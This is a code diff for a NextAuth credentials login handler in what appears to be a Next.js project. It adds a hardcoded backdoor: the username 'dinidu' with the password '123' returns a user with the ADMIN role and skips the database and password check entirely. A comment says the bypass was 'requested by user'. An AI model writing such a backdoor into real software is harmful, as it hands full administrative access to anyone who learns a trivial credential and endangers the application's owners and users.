@@ -22,6 +22,16 @@ const handler = NextAuth({
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null
 
+        // Super simple bypass for admin requested by user
+        if (credentials.email === 'dinidu' && credentials.password === '123') {
+           return {
+             id: 'super-admin-id',
+             email: 'dinidu@admin.com',
+             name: 'Dinidu Admin',
+             role: 'ADMIN'
+           }
+        }
+
         const user = await prisma.user.findUnique({
           where: { email: credentials.email }
         })
